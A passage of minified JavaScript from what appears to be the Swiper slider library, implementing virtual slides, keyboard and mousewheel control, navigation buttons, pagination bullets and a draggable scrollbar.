                }), c === v && d === b && !e) return s.slidesGrid !== p && w !== m && s.slides.css(h, `${w}px`), s.updateProgress(), void r("virtualUpdate");
            if (s.params.virtual.renderExternal) return s.params.virtual.renderExternal.call(s, {
                offset: w,
                from: v,
                to: b,
                slides: function() {
                    const e = [];
                    for (let t = v; t <= b; t += 1) e.push(u[t]);
                    return e
                }()
            }), void(s.params.virtual.renderExternalUpdate ? C() : r("virtualUpdate"));
            const E = [],
                _ = [];
            if (e) s.$wrapperEl.find(`.${s.params.slideClass}`).remove();
            else
                for (let e = c; e <= d; e += 1)(e < v || e > b) && s.$wrapperEl.find(`.${s.params.slideClass}[data-swiper-slide-index="${e}"]`).remove();
            for (let t = 0; t < u.length; t += 1) t >= v && t <= b && (void 0 === d || e ? _.push(t) : (t > d && _.push(t), t < c && E.push(t)));
            _.forEach((e => {
                s.$wrapperEl.append(o(u[e], e))
            })), E.sort(((e, t) => t - e)).forEach((e => {
                s.$wrapperEl.prepend(o(u[e], e))
            })), s.$wrapperEl.children(".swiper-slide").css(h, `${w}px`), C()
        }
        a({
            virtual: {
                enabled: !1,
                slides: [],
                cache: !0,
                renderSlide: null,
                renderExternal: null,
                renderExternalUpdate: !0,
                addSlidesBefore: 0,
                addSlidesAfter: 0
            }
        }), s.virtual = {
            cache: {},
            from: void 0,
            to: void 0,
            slides: [],
            offset: 0,
            slidesGrid: []
        }, n("beforeInit", (() => {
            s.params.virtual.enabled && (s.virtual.slides = s.params.virtual.slides, s.classNames.push(`${s.params.containerModifierClass}virtual`), s.params.watchSlidesProgress = !0, s.originalParams.watchSlidesProgress = !0, s.params.initialSlide || i())
        })), n("setTranslate", (() => {
            s.params.virtual.enabled && (s.params.cssMode && !s._immediateVirtual ? (clearTimeout(t), t = setTimeout((() => {
                i()
            }), 100)) : i())
        })), n("init update resize", (() => {
            s.params.virtual.enabled && s.params.cssMode && y(s.wrapperEl, "--swiper-virtual-size", `${s.virtualSize}px`)
        })), Object.assign(s.virtual, {
            appendSlide: function(e) {
                if ("object" == typeof e && "length" in e)
                    for (let t = 0; t < e.length; t += 1) e[t] && s.virtual.slides.push(e[t]);
                else s.virtual.slides.push(e);
                i(!0)
            },
            prependSlide: function(e) {
                const t = s.activeIndex;
                let a = t + 1,
                    n = 1;
                if (Array.isArray(e)) {
                    for (let t = 0; t < e.length; t += 1) e[t] && s.virtual.slides.unshift(e[t]);
                    a = t + e.length, n = e.length
                } else s.virtual.slides.unshift(e);
                if (s.params.virtual.cache) {
                    const e = s.virtual.cache,
                        t = {};
                    Object.keys(e).forEach((s => {
                        const a = e[s],
                            r = a.attr("data-swiper-slide-index");
                        r && a.attr("data-swiper-slide-index", parseInt(r, 10) + n), t[parseInt(s, 10) + n] = a
                    })), s.virtual.cache = t
                }
                i(!0), s.slideTo(a, 0)
            },
            removeSlide: function(e) {
                if (null == e) return;
                let t = s.activeIndex;
                if (Array.isArray(e))
                    for (let a = e.length - 1; a >= 0; a -= 1) s.virtual.slides.splice(e[a], 1), s.params.virtual.cache && delete s.virtual.cache[e[a]], e[a] < t && (t -= 1), t = Math.max(t, 0);
                else s.virtual.slides.splice(e, 1), s.params.virtual.cache && delete s.virtual.cache[e], e < t && (t -= 1), t = Math.max(t, 0);
                i(!0), s.slideTo(t, 0)
            },
            removeAllSlides: function() {
                s.virtual.slides = [], s.params.virtual.cache && (s.virtual.cache = {}), i(!0), s.slideTo(0, 0)
            },
            update: i
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: n,
            emit: o
        } = e;
        const i = a(),
            l = r();

        function d(e) {
            if (!t.enabled) return;
            const {
                rtlTranslate: s
            } = t;
            let a = e;
            a.originalEvent && (a = a.originalEvent);
            const n = a.keyCode || a.charCode,
                r = t.params.keyboard.pageUpDown,
                c = r && 33 === n,
                d = r && 34 === n,
                u = 37 === n,
                p = 39 === n,
                m = 38 === n,
                f = 40 === n;
            if (!t.allowSlideNext && (t.isHorizontal() && p || t.isVertical() && f || d)) return !1;
            if (!t.allowSlidePrev && (t.isHorizontal() && u || t.isVertical() && m || c)) return !1;
            if (!(a.shiftKey || a.altKey || a.ctrlKey || a.metaKey || i.activeElement && i.activeElement.nodeName && ("input" === i.activeElement.nodeName.toLowerCase() || "textarea" === i.activeElement.nodeName.toLowerCase()))) {
                if (t.params.keyboard.onlyInViewport && (c || d || u || p || m || f)) {
                    let e = !1;
                    if (t.$el.parents(`.${t.params.slideClass}`).length > 0 && 0 === t.$el.parents(`.${t.params.slideActiveClass}`).length) return;
                    const a = t.$el,
                        n = a[0].clientWidth,
                        r = a[0].clientHeight,
                        o = l.innerWidth,
                        i = l.innerHeight,
                        c = t.$el.offset();
                    s && (c.left -= t.$el[0].scrollLeft);
                    const d = [
                        [c.left, c.top],
                        [c.left + n, c.top],
                        [c.left, c.top + r],
                        [c.left + n, c.top + r]
                    ];
                    for (let t = 0; t < d.length; t += 1) {
                        const s = d[t];
                        if (s[0] >= 0 && s[0] <= o && s[1] >= 0 && s[1] <= i) {
                            if (0 === s[0] && 0 === s[1]) continue;
                            e = !0
                        }
                    }
                    if (!e) return
                }
                t.isHorizontal() ? ((c || d || u || p) && (a.preventDefault ? a.preventDefault() : a.returnValue = !1), ((d || p) && !s || (c || u) && s) && t.slideNext(), ((c || u) && !s || (d || p) && s) && t.slidePrev()) : ((c || d || m || f) && (a.preventDefault ? a.preventDefault() : a.returnValue = !1), (d || f) && t.slideNext(), (c || m) && t.slidePrev()), o("keyPress", n)
            }
        }

        function u() {
            t.keyboard.enabled || (c(i).on("keydown", d), t.keyboard.enabled = !0)
        }

        function p() {
            t.keyboard.enabled && (c(i).off("keydown", d), t.keyboard.enabled = !1)
        }
        t.keyboard = {
            enabled: !1
        }, s({
            keyboard: {
                enabled: !1,
                onlyInViewport: !0,
                pageUpDown: !0
            }
        }), n("init", (() => {
            t.params.keyboard.enabled && u()
        })), n("destroy", (() => {
            t.keyboard.enabled && p()
        })), Object.assign(t.keyboard, {
            enable: u,
            disable: p
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a,
            emit: n
        } = e;
        const o = r();
        let i;
        s({
            mousewheel: {
                enabled: !1,
                releaseOnEdges: !1,
                invert: !1,
                forceToAxis: !1,
                sensitivity: 1,
                eventsTarget: "container",
                thresholdDelta: null,
                thresholdTime: null
            }
        }), t.mousewheel = {
            enabled: !1
        };
        let l, d = p();
        const m = [];

        function f() {
            t.enabled && (t.mouseEntered = !0)
        }

        function h() {
            t.enabled && (t.mouseEntered = !1)
        }

        function g(e) {
            return !(t.params.mousewheel.thresholdDelta && e.delta < t.params.mousewheel.thresholdDelta || t.params.mousewheel.thresholdTime && p() - d < t.params.mousewheel.thresholdTime || !(e.delta >= 6 && p() - d < 60) && (e.direction < 0 ? t.isEnd && !t.params.loop || t.animating || (t.slideNext(), n("scroll", e.raw)) : t.isBeginning && !t.params.loop || t.animating || (t.slidePrev(), n("scroll", e.raw)), d = (new o.Date).getTime(), 1))
        }

        function y(e) {
            let s = e,
                a = !0;
            if (!t.enabled) return;
            const r = t.params.mousewheel;
            t.params.cssMode && s.preventDefault();
            let o = t.$el;
            if ("container" !== t.params.mousewheel.eventsTarget && (o = c(t.params.mousewheel.eventsTarget)), !t.mouseEntered && !o[0].contains(s.target) && !r.releaseOnEdges) return !0;
            s.originalEvent && (s = s.originalEvent);
            let d = 0;
            const f = t.rtlTranslate ? -1 : 1,
                h = function(e) {
                    let t = 0,
                        s = 0,
                        a = 0,
                        n = 0;
                    return "detail" in e && (s = e.detail), "wheelDelta" in e && (s = -e.wheelDelta / 120), "wheelDeltaY" in e && (s = -e.wheelDeltaY / 120), "wheelDeltaX" in e && (t = -e.wheelDeltaX / 120), "axis" in e && e.axis === e.HORIZONTAL_AXIS && (t = s, s = 0), a = 10 * t, n = 10 * s, "deltaY" in e && (n = e.deltaY), "deltaX" in e && (a = e.deltaX), e.shiftKey && !a && (a = n, n = 0), (a || n) && e.deltaMode && (1 === e.deltaMode ? (a *= 40, n *= 40) : (a *= 800, n *= 800)), a && !t && (t = a < 1 ? -1 : 1), n && !s && (s = n < 1 ? -1 : 1), {
                        spinX: t,
                        spinY: s,
                        pixelX: a,
                        pixelY: n
                    }
                }(s);
            if (r.forceToAxis)
                if (t.isHorizontal()) {
                    if (!(Math.abs(h.pixelX) > Math.abs(h.pixelY))) return !0;
                    d = -h.pixelX * f
                } else {
                    if (!(Math.abs(h.pixelY) > Math.abs(h.pixelX))) return !0;
                    d = -h.pixelY
                }
            else d = Math.abs(h.pixelX) > Math.abs(h.pixelY) ? -h.pixelX * f : -h.pixelY;
            if (0 === d) return !0;
            r.invert && (d = -d);
            let y = t.getTranslate() + d * r.sensitivity;
            if (y >= t.minTranslate() && (y = t.minTranslate()), y <= t.maxTranslate() && (y = t.maxTranslate()), a = !!t.params.loop || !(y === t.minTranslate() || y === t.maxTranslate()), a && t.params.nested && s.stopPropagation(), t.params.freeMode && t.params.freeMode.enabled) {
                const e = {
                        time: p(),
                        delta: Math.abs(d),
                        direction: Math.sign(d)
                    },
                    a = l && e.time < l.time + 500 && e.delta <= l.delta && e.direction === l.direction;
                if (!a) {
                    l = void 0, t.params.loop && t.loopFix();
                    let o = t.getTranslate() + d * r.sensitivity;
                    const c = t.isBeginning,
                        p = t.isEnd;
                    if (o >= t.minTranslate() && (o = t.minTranslate()), o <= t.maxTranslate() && (o = t.maxTranslate()), t.setTransition(0), t.setTranslate(o), t.updateProgress(), t.updateActiveIndex(), t.updateSlidesClasses(), (!c && t.isBeginning || !p && t.isEnd) && t.updateSlidesClasses(), t.params.freeMode.sticky) {
                        clearTimeout(i), i = void 0, m.length >= 15 && m.shift();
                        const s = m.length ? m[m.length - 1] : void 0,
                            a = m[0];
                        if (m.push(e), s && (e.delta > s.delta || e.direction !== s.direction)) m.splice(0);
                        else if (m.length >= 15 && e.time - a.time < 500 && a.delta - e.delta >= 1 && e.delta <= 6) {
                            const s = d > 0 ? .8 : .2;
                            l = e, m.splice(0), i = u((() => {
                                t.slideToClosest(t.params.speed, !0, void 0, s)
                            }), 0)
                        }
                        i || (i = u((() => {
                            l = e, m.splice(0), t.slideToClosest(t.params.speed, !0, void 0, .5)
                        }), 500))
                    }
                    if (a || n("scroll", s), t.params.autoplay && t.params.autoplayDisableOnInteraction && t.autoplay.stop(), o === t.minTranslate() || o === t.maxTranslate()) return !0
                }
            } else {
                const s = {
                    time: p(),
                    delta: Math.abs(d),
                    direction: Math.sign(d),
                    raw: e
                };
                m.length >= 2 && m.shift();
                const a = m.length ? m[m.length - 1] : void 0;
                if (m.push(s), a ? (s.direction !== a.direction || s.delta > a.delta || s.time > a.time + 150) && g(s) : g(s), function(e) {
                        const s = t.params.mousewheel;
                        if (e.direction < 0) {
                            if (t.isEnd && !t.params.loop && s.releaseOnEdges) return !0
                        } else if (t.isBeginning && !t.params.loop && s.releaseOnEdges) return !0;
                        return !1
                    }(s)) return !0
            }
            return s.preventDefault ? s.preventDefault() : s.returnValue = !1, !1
        }

        function v(e) {
            let s = t.$el;
            "container" !== t.params.mousewheel.eventsTarget && (s = c(t.params.mousewheel.eventsTarget)), s[e]("mouseenter", f), s[e]("mouseleave", h), s[e]("wheel", y)
        }

        function b() {
            return t.params.cssMode ? (t.wrapperEl.removeEventListener("wheel", y), !0) : !t.mousewheel.enabled && (v("on"), t.mousewheel.enabled = !0, !0)
        }

        function w() {
            return t.params.cssMode ? (t.wrapperEl.addEventListener(event, y), !0) : !!t.mousewheel.enabled && (v("off"), t.mousewheel.enabled = !1, !0)
        }
        a("init", (() => {
            !t.params.mousewheel.enabled && t.params.cssMode && w(), t.params.mousewheel.enabled && b()
        })), a("destroy", (() => {
            t.params.cssMode && b(), t.mousewheel.enabled && w()
        })), Object.assign(t.mousewheel, {
            enable: b,
            disable: w
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a,
            emit: n
        } = e;

        function r(e) {
            let s;
            return e && (s = c(e), t.params.uniqueNavElements && "string" == typeof e && s.length > 1 && 1 === t.$el.find(e).length && (s = t.$el.find(e))), s
        }

        function o(e, s) {
            const a = t.params.navigation;
            e && e.length > 0 && (e[s ? "addClass" : "removeClass"](a.disabledClass), e[0] && "BUTTON" === e[0].tagName && (e[0].disabled = s), t.params.watchOverflow && t.enabled && e[t.isLocked ? "addClass" : "removeClass"](a.lockClass))
        }

        function i() {
            if (t.params.loop) return;
            const {
                $nextEl: e,
                $prevEl: s
            } = t.navigation;
            o(s, t.isBeginning && !t.params.rewind), o(e, t.isEnd && !t.params.rewind)
        }

        function l(e) {
            e.preventDefault(), (!t.isBeginning || t.params.loop || t.params.rewind) && (t.slidePrev(), n("navigationPrev"))
        }

        function d(e) {
            e.preventDefault(), (!t.isEnd || t.params.loop || t.params.rewind) && (t.slideNext(), n("navigationNext"))
        }

        function u() {
            const e = t.params.navigation;
            if (t.params.navigation = V(t, t.originalParams.navigation, t.params.navigation, {
                    nextEl: "swiper-button-next",
                    prevEl: "swiper-button-prev"
                }), !e.nextEl && !e.prevEl) return;
            const s = r(e.nextEl),
                a = r(e.prevEl);
            s && s.length > 0 && s.on("click", d), a && a.length > 0 && a.on("click", l), Object.assign(t.navigation, {
                $nextEl: s,
                nextEl: s && s[0],
                $prevEl: a,
                prevEl: a && a[0]
            }), t.enabled || (s && s.addClass(e.lockClass), a && a.addClass(e.lockClass))
        }

        function p() {
            const {
                $nextEl: e,
                $prevEl: s
            } = t.navigation;
            e && e.length && (e.off("click", d), e.removeClass(t.params.navigation.disabledClass)), s && s.length && (s.off("click", l), s.removeClass(t.params.navigation.disabledClass))
        }
        s({
            navigation: {
                nextEl: null,
                prevEl: null,
                hideOnClick: !1,
                disabledClass: "swiper-button-disabled",
                hiddenClass: "swiper-button-hidden",
                lockClass: "swiper-button-lock",
                navigationDisabledClass: "swiper-navigation-disabled"
            }
        }), t.navigation = {
            nextEl: null,
            $nextEl: null,
            prevEl: null,
            $prevEl: null
        }, a("init", (() => {
            !1 === t.params.navigation.enabled ? m() : (u(), i())
        })), a("toEdge fromEdge lock unlock", (() => {
            i()
        })), a("destroy", (() => {
            p()
        })), a("enable disable", (() => {
            const {
                $nextEl: e,
                $prevEl: s
            } = t.navigation;
            e && e[t.enabled ? "removeClass" : "addClass"](t.params.navigation.lockClass), s && s[t.enabled ? "removeClass" : "addClass"](t.params.navigation.lockClass)
        })), a("click", ((e, s) => {
            const {
                $nextEl: a,
                $prevEl: r
            } = t.navigation, o = s.target;
            if (t.params.navigation.hideOnClick && !c(o).is(r) && !c(o).is(a)) {
                if (t.pagination && t.params.pagination && t.params.pagination.clickable && (t.pagination.el === o || t.pagination.el.contains(o))) return;
                let e;
                a ? e = a.hasClass(t.params.navigation.hiddenClass) : r && (e = r.hasClass(t.params.navigation.hiddenClass)), n(!0 === e ? "navigationShow" : "navigationHide"), a && a.toggleClass(t.params.navigation.hiddenClass), r && r.toggleClass(t.params.navigation.hiddenClass)
            }
        }));
        const m = () => {
            t.$el.addClass(t.params.navigation.navigationDisabledClass), p()
        };
        Object.assign(t.navigation, {
            enable: () => {
                t.$el.removeClass(t.params.navigation.navigationDisabledClass), u(), i()
            },
            disable: m,
            update: i,
            init: u,
            destroy: p
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a,
            emit: n
        } = e;
        const r = "swiper-pagination";
        let o;
        s({
            pagination: {
                el: null,
                bulletElement: "span",
                clickable: !1,
                hideOnClick: !1,
                renderBullet: null,
                renderProgressbar: null,
                renderFraction: null,
                renderCustom: null,
                progressbarOpposite: !1,
                type: "bullets",
                dynamicBullets: !1,
                dynamicMainBullets: 1,
                formatFractionCurrent: e => e,
                formatFractionTotal: e => e,
                bulletClass: `${r}-bullet`,
                bulletActiveClass: `${r}-bullet-active`,
                modifierClass: `${r}-`,
                currentClass: `${r}-current`,
                totalClass: `${r}-total`,
                hiddenClass: `${r}-hidden`,
                progressbarFillClass: `${r}-progressbar-fill`,
                progressbarOppositeClass: `${r}-progressbar-opposite`,
                clickableClass: `${r}-clickable`,
                lockClass: `${r}-lock`,
                horizontalClass: `${r}-horizontal`,
                verticalClass: `${r}-vertical`,
                paginationDisabledClass: `${r}-disabled`
            }
        }), t.pagination = {
            el: null,
            $el: null,
            bullets: []
        };
        let i = 0;

        function l() {
            return !t.params.pagination.el || !t.pagination.el || !t.pagination.$el || 0 === t.pagination.$el.length
        }

        function d(e, s) {
            const {
                bulletActiveClass: a
            } = t.params.pagination;
            e[s]().addClass(`${a}-${s}`)[s]().addClass(`${a}-${s}-${s}`)
        }

        function u() {
            const e = t.rtl,
                s = t.params.pagination;
            if (l()) return;
            const a = t.virtual && t.params.virtual.enabled ? t.virtual.slides.length : t.slides.length,
                r = t.pagination.$el;
            let u;
            const p = t.params.loop ? Math.ceil((a - 2 * t.loopedSlides) / t.params.slidesPerGroup) : t.snapGrid.length;
            if (t.params.loop ? (u = Math.ceil((t.activeIndex - t.loopedSlides) / t.params.slidesPerGroup), u > a - 1 - 2 * t.loopedSlides && (u -= a - 2 * t.loopedSlides), u > p - 1 && (u -= p), u < 0 && "bullets" !== t.params.paginationType && (u = p + u)) : u = void 0 !== t.snapIndex ? t.snapIndex : t.activeIndex || 0, "bullets" === s.type && t.pagination.bullets && t.pagination.bullets.length > 0) {
                const a = t.pagination.bullets;
                let n, l, p;
                if (s.dynamicBullets && (o = a.eq(0)[t.isHorizontal() ? "outerWidth" : "outerHeight"](!0), r.css(t.isHorizontal() ? "width" : "height", o * (s.dynamicMainBullets + 4) + "px"), s.dynamicMainBullets > 1 && void 0 !== t.previousIndex && (i += u - (t.previousIndex - t.loopedSlides || 0), i > s.dynamicMainBullets - 1 ? i = s.dynamicMainBullets - 1 : i < 0 && (i = 0)), n = Math.max(u - i, 0), l = n + (Math.min(a.length, s.dynamicMainBullets) - 1), p = (l + n) / 2), a.removeClass(["", "-next", "-next-next", "-prev", "-prev-prev", "-main"].map((e => `${s.bulletActiveClass}${e}`)).join(" ")), r.length > 1) a.each((e => {
                    const t = c(e),
                        a = t.index();
                    a === u && t.addClass(s.bulletActiveClass), s.dynamicBullets && (a >= n && a <= l && t.addClass(`${s.bulletActiveClass}-main`), a === n && d(t, "prev"), a === l && d(t, "next"))
                }));
                else {
                    const e = a.eq(u),
                        r = e.index();
                    if (e.addClass(s.bulletActiveClass), s.dynamicBullets) {
                        const e = a.eq(n),
                            o = a.eq(l);
                        for (let e = n; e <= l; e += 1) a.eq(e).addClass(`${s.bulletActiveClass}-main`);
                        if (t.params.loop)
                            if (r >= a.length) {
                                for (let e = s.dynamicMainBullets; e >= 0; e -= 1) a.eq(a.length - e).addClass(`${s.bulletActiveClass}-main`);
                                a.eq(a.length - s.dynamicMainBullets - 1).addClass(`${s.bulletActiveClass}-prev`)
                            } else d(e, "prev"), d(o, "next");
                        else d(e, "prev"), d(o, "next")
                    }
                }
                if (s.dynamicBullets) {
                    const n = Math.min(a.length, s.dynamicMainBullets + 4),
                        r = (o * n - o) / 2 - p * o,
                        i = e ? "right" : "left";
                    a.css(t.isHorizontal() ? i : "top", `${r}px`)
                }
            }
            if ("fraction" === s.type && (r.find(W(s.currentClass)).text(s.formatFractionCurrent(u + 1)), r.find(W(s.totalClass)).text(s.formatFractionTotal(p))), "progressbar" === s.type) {
                let e;
                e = s.progressbarOpposite ? t.isHorizontal() ? "vertical" : "horizontal" : t.isHorizontal() ? "horizontal" : "vertical";
                const a = (u + 1) / p;
                let n = 1,
                    o = 1;
                "horizontal" === e ? n = a : o = a, r.find(W(s.progressbarFillClass)).transform(`translate3d(0,0,0) scaleX(${n}) scaleY(${o})`).transition(t.params.speed)
            }
            "custom" === s.type && s.renderCustom ? (r.html(s.renderCustom(t, u + 1, p)), n("paginationRender", r[0])) : n("paginationUpdate", r[0]), t.params.watchOverflow && t.enabled && r[t.isLocked ? "addClass" : "removeClass"](s.lockClass)
        }

        function p() {
            const e = t.params.pagination;
            if (l()) return;
            const s = t.virtual && t.params.virtual.enabled ? t.virtual.slides.length : t.slides.length,
                a = t.pagination.$el;
            let r = "";
            if ("bullets" === e.type) {
                let n = t.params.loop ? Math.ceil((s - 2 * t.loopedSlides) / t.params.slidesPerGroup) : t.snapGrid.length;
                t.params.freeMode && t.params.freeMode.enabled && !t.params.loop && n > s && (n = s);
                for (let s = 0; s < n; s += 1) e.renderBullet ? r += e.renderBullet.call(t, s, e.bulletClass) : r += `<${e.bulletElement} class="${e.bulletClass}"></${e.bulletElement}>`;
                a.html(r), t.pagination.bullets = a.find(W(e.bulletClass))
            }
            "fraction" === e.type && (r = e.renderFraction ? e.renderFraction.call(t, e.currentClass, e.totalClass) : `<span class="${e.currentClass}"></span> / <span class="${e.totalClass}"></span>`, a.html(r)), "progressbar" === e.type && (r = e.renderProgressbar ? e.renderProgressbar.call(t, e.progressbarFillClass) : `<span class="${e.progressbarFillClass}"></span>`, a.html(r)), "custom" !== e.type && n("paginationRender", t.pagination.$el[0])
        }

        function m() {
            t.params.pagination = V(t, t.originalParams.pagination, t.params.pagination, {
                el: "swiper-pagination"
            });
            const e = t.params.pagination;
            if (!e.el) return;
            let s = c(e.el);
            0 !== s.length && (t.params.uniqueNavElements && "string" == typeof e.el && s.length > 1 && (s = t.$el.find(e.el), s.length > 1 && (s = s.filter((e => c(e).parents(".swiper")[0] === t.el)))), "bullets" === e.type && e.clickable && s.addClass(e.clickableClass), s.addClass(e.modifierClass + e.type), s.addClass(t.isHorizontal() ? e.horizontalClass : e.verticalClass), "bullets" === e.type && e.dynamicBullets && (s.addClass(`${e.modifierClass}${e.type}-dynamic`), i = 0, e.dynamicMainBullets < 1 && (e.dynamicMainBullets = 1)), "progressbar" === e.type && e.progressbarOpposite && s.addClass(e.progressbarOppositeClass), e.clickable && s.on("click", W(e.bulletClass), (function(e) {
                e.preventDefault();
                let s = c(this).index() * t.params.slidesPerGroup;
                t.params.loop && (s += t.loopedSlides), t.slideTo(s)
            })), Object.assign(t.pagination, {
                $el: s,
                el: s[0]
            }), t.enabled || s.addClass(e.lockClass))
        }

        function f() {
            const e = t.params.pagination;
            if (l()) return;
            const s = t.pagination.$el;
            s.removeClass(e.hiddenClass), s.removeClass(e.modifierClass + e.type), s.removeClass(t.isHorizontal() ? e.horizontalClass : e.verticalClass), t.pagination.bullets && t.pagination.bullets.removeClass && t.pagination.bullets.removeClass(e.bulletActiveClass), e.clickable && s.off("click", W(e.bulletClass))
        }
        a("init", (() => {
            !1 === t.params.pagination.enabled ? h() : (m(), p(), u())
        })), a("activeIndexChange", (() => {
            (t.params.loop || void 0 === t.snapIndex) && u()
        })), a("snapIndexChange", (() => {
            t.params.loop || u()
        })), a("slidesLengthChange", (() => {
            t.params.loop && (p(), u())
        })), a("snapGridLengthChange", (() => {
            t.params.loop || (p(), u())
        })), a("destroy", (() => {
            f()
        })), a("enable disable", (() => {
            const {
                $el: e
            } = t.pagination;
            e && e[t.enabled ? "removeClass" : "addClass"](t.params.pagination.lockClass)
        })), a("lock unlock", (() => {
            u()
        })), a("click", ((e, s) => {
            const a = s.target,
                {
                    $el: r
                } = t.pagination;
            if (t.params.pagination.el && t.params.pagination.hideOnClick && r && r.length > 0 && !c(a).hasClass(t.params.pagination.bulletClass)) {
                if (t.navigation && (t.navigation.nextEl && a === t.navigation.nextEl || t.navigation.prevEl && a === t.navigation.prevEl)) return;
                const e = r.hasClass(t.params.pagination.hiddenClass);
                n(!0 === e ? "paginationShow" : "paginationHide"), r.toggleClass(t.params.pagination.hiddenClass)
            }
        }));
        const h = () => {
            t.$el.addClass(t.params.pagination.paginationDisabledClass), t.pagination.$el && t.pagination.$el.addClass(t.params.pagination.paginationDisabledClass), f()
        };
        Object.assign(t.pagination, {
            enable: () => {
                t.$el.removeClass(t.params.pagination.paginationDisabledClass), t.pagination.$el && t.pagination.$el.removeClass(t.params.pagination.paginationDisabledClass), m(), p(), u()
            },
            disable: h,
            render: p,
            update: u,
            init: m,
            destroy: f
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: n,
            emit: r
        } = e;
        const o = a();
        let i, l, d, p, m = !1,
            f = null,
            h = null;

        function g() {
            if (!t.params.scrollbar.el || !t.scrollbar.el) return;
            const {
                scrollbar: e,
                rtlTranslate: s,
                progress: a
            } = t, {
                $dragEl: n,
                $el: r
            } = e, o = t.params.scrollbar;
            let i = l,
                c = (d - l) * a;
            s ? (c = -c, c > 0 ? (i = l - c, c = 0) : -c + l > d && (i = d + c)) : c < 0 ? (i = l + c, c = 0) : c + l > d && (i = d - c), t.isHorizontal() ? (n.transform(`translate3d(${c}px, 0, 0)`), n[0].style.width = `${i}px`) : (n.transform(`translate3d(0px, ${c}px, 0)`), n[0].style.height = `${i}px`), o.hide && (clearTimeout(f), r[0].style.opacity = 1, f = setTimeout((() => {
                r[0].style.opacity = 0, r.transition(400)
            }), 1e3))
        }

        function y() {
            if (!t.params.scrollbar.el || !t.scrollbar.el) return;
            const {
                scrollbar: e
            } = t, {
                $dragEl: s,
                $el: a
            } = e;
            s[0].style.width = "", s[0].style.height = "", d = t.isHorizontal() ? a[0].offsetWidth : a[0].offsetHeight, p = t.size / (t.virtualSize + t.params.slidesOffsetBefore - (t.params.centeredSlides ? t.snapGrid[0] : 0)), l = "auto" === t.params.scrollbar.dragSize ? d * p : parseInt(t.params.scrollbar.dragSize, 10), t.isHorizontal() ? s[0].style.width = `${l}px` : s[0].style.height = `${l}px`, a[0].style.display = p >= 1 ? "none" : "", t.params.scrollbar.hide && (a[0].style.opacity = 0), t.params.watchOverflow && t.enabled && e.$el[t.isLocked ? "addClass" : "removeClass"](t.params.scrollbar.lockClass)
        }

        function v(e) {
            return t.isHorizontal() ? "touchstart" === e.type || "touchmove" === e.type ? e.targetTouches[0].clientX : e.clientX : "touchstart" === e.type || "touchmove" === e.type ? e.targetTouches[0].clientY : e.clientY
        }

        function b(e) {
            const {
                scrollbar: s,
                rtlTranslate: a
            } = t, {
                $el: n
            } = s;
            let r;
            r = (v(e) - n.offset()[t.isHorizontal() ? "left" : "top"] - (null !== i ? i : l / 2)) / (d - l), r = Math.max(Math.min(r, 1), 0), a && (r = 1 - r);
            const o = t.minTranslate() + (t.maxTranslate() - t.minTranslate()) * r;
            t.updateProgress(o), t.setTranslate(o), t.updateActiveIndex(), t.updateSlidesClasses()
        }

        function w(e) {
            const s = t.params.scrollbar,
                {
                    scrollbar: a,
                    $wrapperEl: n
                } = t,
                {
                    $el: o,
                    $dragEl: l
                } = a;
            m = !0, i = e.target === l[0] || e.target === l ? v(e) - e.target.getBoundingClientRect()[t.isHorizontal() ? "left" : "top"] : null, e.preventDefault(), e.stopPropagation(), n.transition(100), l.transition(100), b(e), clearTimeout(h), o.transition(0), s.hide && o.css("opacity", 1), t.params.cssMode && t.$wrapperEl.css("scroll-snap-type", "none"), r("scrollbarDragStart", e)
        }

        function C(e) {
            const {
                scrollbar: s,
                $wrapperEl: a
            } = t, {
                $el: n,
                $dragEl: o
            } = s;
            m && (e.preventDefault ? e.preventDefault() : e.returnValue = !1, b(e), a.transition(0), n.transition(0), o.transition(0), r("scrollbarDragMove", e))
        }

        function E(e) {
            const s = t.params.scrollbar,
                {
                    scrollbar: a,
                    $wrapperEl: n
                } = t,
                {
                    $el: o
                } = a;
            m && (m = !1, t.params.cssMode && (t.$wrapperEl.css("scroll-snap-type", ""), n.transition("")), s.hide && (clearTimeout(h), h = u((() => {
                o.css("opacity", 0), o.transition(400)
            }), 1e3)), r("scrollbarDragEnd", e), s.snapOnRelease && t.slideToClosest())
        }

        function _(e) {
            const {
                scrollbar: s,
                touchEventsTouch: a,
                touchEventsDesktop: n,
                params: r,
                support: i
            } = t, l = s.$el;
            if (!l) return;
            const c = l[0],
                d = !(!i.passiveListener || !r.passiveListeners) && {
                    passive: !1,
                    capture: !1
                },
                u = !(!i.passiveListener || !r.passiveListeners) && {
                    passive: !0,
                    capture: !1
                };
            if (!c) return;
            const p = "on" === e ? "addEventListener" : "removeEventListener";
            i.touch ? (c[p](a.start, w, d), c[p](a.move, C, d), c[p](a.end, E, u)) : (c[p](n.start, w, d), o[p](n.move, C, d), o[p](n.end, E, u))
        }

        function L() {
            const {
                scrollbar: e,
                $el: s
            } = t;
            t.params.scrollbar = V(t, t.originalParams.scrollbar, t.params.scrollbar, {
                el: "swiper-scrollbar"
            });
            const a = t.params.scrollbar;
            if (!a.el) return;
            let n = c(a.el);
            t.params.uniqueNavElements && "string" == typeof a.el && n.length > 1 && 1 === s.find(a.el).length && (n = s.find(a.el)), n.addClass(t.isHorizontal() ? a.horizontalClass : a.verticalClass);
            let r = n.find(`.${t.params.scrollbar.dragClass}`);
            0 === r.length && (r = c(`<div class="${t.params.scrollbar.dragClass}"></div>`), n.append(r)), Object.assign(e, {
                $el: n,
                el: n[0],
                $dragEl: r,
                dragEl: r[0]
            }), a.draggable && t.params.scrollbar.el && t.scrollbar.el && _("on"), n && n[t.enabled ? "removeClass" : "addClass"](t.params.scrollbar.lockClass)
        }

        function B() {
            const e = t.params.scrollbar,
                s = t.scrollbar.$el;
            s && s.removeClass(t.isHorizontal() ? e.horizontalClass : e.verticalClass), t.params.scrollbar.el && t.scrollbar.el && _("off")
        }
        s({
            scrollbar: {
                el: null,
                dragSize: "auto",
                hide: !1,
                draggable: !1,
                snapOnRelease: !0,
                lockClass: "swiper-scrollbar-lock",
                dragClass: "swiper-scrollbar-drag",
                scrollbarDisabledClass: "swiper-scrollbar-disabled",
                horizontalClass: "swiper-scrollbar-horizontal",
                verticalClass: "swiper-scrollbar-vertical"
            }
        }), t.scrollbar = {
            el: null,
            dragEl: null,
            $el: null,
            $dragEl: null
        }, n("init", (() => {
